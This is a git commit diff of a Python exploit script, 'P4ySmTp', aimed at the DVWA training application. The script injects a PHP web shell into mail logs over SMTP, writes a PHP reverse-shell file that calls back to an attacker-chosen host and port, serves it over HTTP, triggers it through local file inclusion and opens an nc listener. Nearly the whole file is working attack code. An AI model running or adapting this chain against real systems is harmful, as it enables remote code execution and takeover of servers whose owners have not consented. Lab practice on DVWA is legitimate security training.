8e7e6a57b7d6c578bb39c33c180de41d55292f8c
ron020 <67347156+ron020@users.noreply.github.com>
2020-07-13 21:22:49 -0300

    Update dvwaPaySmtp.py

--- dvwaPaySmtp.py
+++ dvwaPaySmtp.py
@@ -3,25 +3,19 @@ import os
 import sys
 import socket
 import random
+import getpass
 import requests
 import threading
 import http.server
 import socketserver
 from urllib.parse import urlparse
 
-red = "\033[1;31m"
-green = "\033[1;32m"
-yellow = "\033[1;33m"
-blue = "\033[1;36m"
-white = "\033[1;37m"
-
-
 def banner():
-	print (yellow+"[++]"+white+"+=======================================================+"+yellow+"[++]")
-	print (yellow+"[++]"+white+"|                 "+yellow+" P4ySmTp" +white+" (version DVWA)               |"+yellow+"[++]")
-	print (yellow+"[++]"+white+"|"+blue+"Use:python3 dvwaPaySmtp.py host port user              "+white+"|"+yellow+"[++]")
-	print (yellow+"[++]"+white+"|"+blue+"Example:python3 dvwaPaySmtp.py 192.168.0.10 25 www-data"+white+"|"+yellow+"[++]")
-	print (yellow+"[++]"+white+"+=======================================================+"+yellow+"[++]")
+        print ("[++]+=======================================================+[++]")
+        print ("[++]|                  P4ySmTp (version DVWA)               |[++]")
+        print ("[++]|Use:python3 dvwaPaySmtp.py host port user              |[++]")
+        print ("[++]|Example:python3 dvwaPaySmtp.py 192.168.0.10 25 www-data|[++]")
+        print ("[++]+=======================================================+[++]")
 
 
 def conn_login():
@@ -40,7 +34,7 @@ def conn_login():
                         'Login':'Login'
                  }
 
-		#SECURITY LEVEL(DVWA)
+                #SECURITY LEVEL(DVWA)
                 level_payload = {
                         'security':'{}'.format(sec_level),
                         'seclev_submit':'Submit'
@@ -54,63 +48,59 @@ def conn_login():
 
 
 def payload_php():
-	rev_php = "<?php $sock=fsockopen('{a}',{b});exec('/bin/sh -i <&3 >&3 2>&3');?>".format(a=str(ip), b=int(port))
-	with open("reverse.php","a") as reverse_php:
-        	reverse_php.write(str(rev_php))
-
+        rev_php = "<?php $sock=fsockopen('{a}',{b});exec('/bin/bash -i <&3 >&3 2>&3');?>".format(a=str(ip), b=int(port))
+        with open("reverse.php","a") as reverse_php:
+                reverse_php.write(str(rev_php))
 
 try:
 
-	if len(sys.argv) != 4:
-		banner()
+        if len(sys.argv) != 4:
+                banner()
 
-	else:
-		banner()
+        else:
+                banner()
 
 
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((sys.argv[1],int(sys.argv[2])))
-		sock = (str(s.recv(1024)).replace("'", "").replace(r'\r\n', '').strip("b").strip("220"))
-		print (yellow+"[++]"+red+" Connected to: "+green, sock)
-		print (yellow+"[++]"+green+"Sending Payload")
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((sys.argv[1],int(sys.argv[2])))
+                sock = (str(s.recv(1024)).replace("'", "").replace(r'\r\n', '').strip("b").strip("220"))
+                print ("[++] Connected to: ", sock)
+                print ("[++] Sending Payload")
 
-		s.send(bytes("helo "+sys.argv[1]+"\r\n", "utf-8"))
-		s.send(bytes("MAIL FROM:<exploit>\r\n", "utf-8"))
-		s.send(bytes("RCPT TO:<"+sys.argv[3]+">\r\n", "utf-8"))
-		s.send(bytes("DATA\r\n", "utf-8"))
-		s.send(bytes("<?php system($_GET['cmd']);?>\r\n", "utf-8"))
-		print (yellow+"[++]"+red+"<?php system($_GET["+green+"'cmd'"+red+"]);?>")
-		s.send(bytes(".\r\n", "utf-8"))
-		s.send(bytes("QUIT\r\n", "utf-8"))
-		print (yellow+"["+green+"**"+yellow+"]"+green+"Payload Successful ")
+                s.send(bytes("helo "+sys.argv[1]+"\r\n", "utf-8"))
+                s.send(bytes("MAIL FROM:<exploit>\r\n", "utf-8"))
+                s.send(bytes("RCPT TO:<"+sys.argv[3]+">\r\n", "utf-8"))
+                s.send(bytes("DATA\r\n", "utf-8"))
+                s.send(bytes("<?php system($_GET['cmd']);?>\r\n", "utf-8"))
+                s.send(bytes(".\r\n", "utf-8"))
+                s.send(bytes("QUIT\r\n", "utf-8"))
+                print ("[**] Payload Successful")
 
-		# REVERSE SHELL
-		print (yellow+"[++]"+red+"                    ***Reverse_Shell***"+white)
+                # REVERSE SHELL
+                print ("[++]"," "*21,"***Reverse_Shell***")
 
-		sec_level = input(yellow+"[++]"+red+str("(DVWA)Select Level > "+green+"low"+red+" | "+green+"medium"+red+" | "+green+"high"+red+" : ")+white)
-		url = input(yellow+"[++]"+red+"URL/LFI: "+white)
-		user = input(yellow+"[++]"+red+"User: "+white)
-		passwd = input(yellow+"[++]"+red+"Password: "+white)
-		ip = str(input(yellow+"[++]"+red+"lhost: "+white))
-		port = int(input(yellow+"[++]"+red+"lport: "+white))
-		payload_php()
+                sec_level = input(str("[++] (DVWA)Select Level > low : medium : high : >> "))
+                url = input("[++] URL/LFI: ")
+                user = input("[++] User: ")
+                passwd = input(str("[++] Password: "))
+                ip = str(input("[++] lhost: "))
+                port = int(input("[++] lport: "))
+                payload_php()
 
-		#HTTP SERVER
-		port_server = (random.randrange(80, 65535))
-		Handler = http.server.SimpleHTTPRequestHandler
-		httpd = socketserver.TCPServer(("", port_server), Handler)
-		server_thread = threading.Thread(target=httpd.serve_forever)
-		server_thread.daemon = True
-		server_thread.start()
+                #HTTP SERVER
+                port_server = (random.randrange(80, 65535))
+                Handler = http.server.SimpleHTTPRequestHandler
+                httpd = socketserver.TCPServer(("", port_server), Handler)
+                server_thread = threading.Thread(target=httpd.serve_forever)
+                server_thread.daemon = True
+                server_thread.start()
 
-		#HTTP CLIENT
-		client_thread = threading.Thread(target=conn_login)
-		client_thread.start()
-		os.system("nc -nlp {}".format(port))
-		os.system("rm reverse.php")
-		httpd.shutdown()
-		httpd.server_close()
+                #HTTP CLIENT
+                client_thread = threading.Thread(target=conn_login)
+                client_thread.start()
+                os.system("nc -vnlp {}".format(port))
+                os.system("rm reverse.php")
+                httpd.shutdown()
+                httpd.server_close()
 except:
-	print (yellow+"["+red+"!!"+yellow+"]"+red+" Payload Failed "+yellow+"["+red+"!!"+yellow+"]")
-
-
+        print ("\n[!!] Payload Failed [!!]")
